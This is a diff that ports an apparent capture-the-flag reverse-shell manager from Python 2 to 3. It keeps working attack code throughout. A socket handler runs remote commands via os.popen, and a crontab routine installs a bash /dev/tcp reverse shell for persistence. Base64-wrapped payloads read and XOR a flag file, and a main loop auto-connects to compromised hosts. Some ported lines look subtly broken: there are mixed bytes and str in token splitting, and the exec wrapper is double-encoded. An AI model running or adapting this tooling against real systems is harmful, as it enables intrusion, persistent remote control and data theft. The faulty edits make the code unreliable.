@@ -1,19 +1,20 @@
 #!/usr/bin/env python
 # -*- coding: utf-8 -*-
 
-import socket
-import threading
-import time
 import hashlib
+import os
 import random
+import requests
+import signal
+import socket
 import string
 import sys
-import os
-import signal
-import requests
-import sys
+import threading
+import time
+import traceback
 
 from rshm.utils.log import Log
+from rshm.utils.misc import base64_encode, base64_decode
 
 slaves = {}
 masters = {}
@@ -29,7 +30,8 @@ def submit_flag(flag):
         url = "http://127.0.0.1:5000/?flag=%s" % (flag)
         print((requests.get(url).content))
     except Exception as e:
-        print(e)
+        traceback.print_exc()
+        print(repr(e))
 
 def md5(data):
     if type(data) == str:
@@ -38,14 +40,14 @@ def md5(data):
 
 
 def recvuntil(p, target):
-    data = ""
+    data = b""
     while target not in data:
         data += p.recv(1)
     return data
 
 
 def recvall(socket_fd):
-    data = ""
+    data = b""
     size = 0x100
     while True:
         r = socket_fd.recv(size)
@@ -65,15 +67,17 @@ def slaver(host, port, fake):
         if EXIT_FLAG:
             Log.warning("Slaver function exiting...")
             break
-        command = recvuntil(slaver_fd, "\n")
+        command = recvuntil(slaver_fd, b"\n")
         if fake:
-            slaver_fd.send(banner)
+            slaver_fd.send(banner.encode("utf-8"))
         # Log.info("Executing : %r" % (command))
         try:
             result = os.popen(command).read()
-        except:
+        except Exception as e:
+            traceback.print_exc()
+            print(repr(e))
             result = ""
-        slaver_fd.send(command + result)
+        slaver_fd.send((command + result).encode("utf-8"))
     Log.warning("Closing connection...")
     slaver_fd.shutdown(socket.SHUT_RDWR)
     slaver_fd.close()
@@ -93,7 +97,7 @@ def transfer(h):
         if not buffer:
             Log.error("No data, breaking...")
             break
-        sys.stdout.write(buffer)
+        sys.stdout.write(buffer.decode("utf-8"))
         if not interactive_stat:
             break
     if interactive_stat:
@@ -126,7 +130,8 @@ class Slave():
             content = response.content
             return json.loads(content)["data"]
         except Exception as e:
-            Log.error(str(e))
+            traceback.print_exc()
+            Log.error(repr(e))
         '''
         return {"data":"error", 'country': 'Unknown_country','isp': 'Unknown_isp','area': 'Unknown_area','region': 'Unknown_region','city': 'Unknown_city',}
 
@@ -138,21 +143,23 @@ class Slave():
 
     def send_command(self, command):
         try:
-            self.socket_fd.send(command + "\n")
+            self.socket_fd.send((command + "\n").encode("utf-8"))
             return True
-        except:
+        except Exception as e:
+            traceback.print_exc()
+            print(repr(e))
             self.remove_node()
             return False
 
     def system_token(self, command):
-        token = random_string(0x10,string.letters)
+        token = random_string(0x10,string.ascii_letters + string.digits)
         payload = "echo '%s' && %s ; echo '%s'\n" % (token, command, token)
         Log.info(payload)
         self.send_command(payload)
         time.sleep(0.2)
         result = recvall(self.socket_fd)
         print(("%r") % (result))
-        if len(result.split(token)) == 3:
+        if len(result.split(token.encode("utf-8"))) == 3:
             return result.split(token)[1]
         else:
             return "Somthing wrong"
@@ -191,10 +198,12 @@ class Slave():
                 command = input()
                 if command == "exit":
                     self.interactive = False
-                    self.socket_fd.send("\n")
+                    self.socket_fd.send(b"\n")
                     break
-                self.socket_fd.send(command + "\n")
-        except:
+                self.socket_fd.send((command + "\n").encode("utf-8"))
+        except Exception as e:
+            traceback.print_exc()
+            print(repr(e))
             self.remove_node()
         self.interactive = False
         time.sleep(0.125)
@@ -212,7 +221,7 @@ class Slave():
         # 3. Add a new task
         content = content + "\n"
         Log.info("Add new tasks : %s" % (content))
-        command = 'echo "%s" | base64 -d >> %s' % (content.encode("base64").replace("\n", ""), target_file)
+        command = 'echo "%s" | base64 -d >> %s' % (base64_encode(content).replace("\n", ""), target_file)
         self.send_command(command)
         # 4. Rescue crontab file
         Log.info("Rescuing crontab file...")
@@ -250,7 +259,7 @@ class Slave():
         # self.del_crontab("bash")
         content = '* * * * * bash -c "bash -i &>/dev/tcp/%s/%d 0>&1"\n' % (target_host, target_port)
         # self.add_crontab(content)
-        self.system_token("crontab -r;echo '%s'|base64 -d|crontab" % (content.encode("base64").replace("\n", "")))
+        self.system_token("crontab -r;echo '%s'|base64 -d|crontab" % (base64_encode(content).replace("\n", "")))
 
     def remove_node(self):
         Log.error("Removing Node!")
@@ -426,14 +435,14 @@ def main():
                     r_host = r_info.split(":")[0]
                     r_port = int(r_info.split(":")[1])
                     slave.auto_connect(r_host, r_port)
-                    payload = "python -c 'exec(\"%s\".decode(\"base64\"))'" % '''
+                    payload = base64_encode("python -c 'exec(\"%s\".decode(\"base64\"))'" % '''
 flag = open("__FLAG_PATH__").read()
 key = 233
 result = ""
 for i in flag:
     result += chr(ord(i) ^ key)
 print result
-                    '''.replace("__FLAG_PATH__", flag_path).encode("base64").replace("\n", "")
+                    '''.replace("__FLAG_PATH__", flag_path)).replace("\n", "")
                     # cmd = "FLAG=`%s`" % (payload)
                     # Log.info(cmd)
                     # exit(0)
@@ -469,14 +478,14 @@ print result
             # box_host = raw_input("Input flag box host (192.168.187.128) : ") or (
                 # "192.168.187.128")
             # box_port = int(raw_input("Input flag box host (80) : ") or ("80"))
-            payload = "python -c 'exec(\"%s\".decode(\"base64\"))'" % '''
+            payload = base64_encode("python -c 'exec(\"%s\".decode(\"base64\"))'" % '''
 flag = open("__FLAG_PATH__").read()
 key = 233
 result = ""
 for i in flag:
     result += chr(ord(i) ^ key)
 print result
-            '''.replace("__FLAG_PATH__", flag_path).encode("base64").replace("\n", "")
+            '''.replace("__FLAG_PATH__", flag_path))
             # cmd = "FLAG=`%s`" % (payload)
             # Log.info(cmd)
             # exit(0)
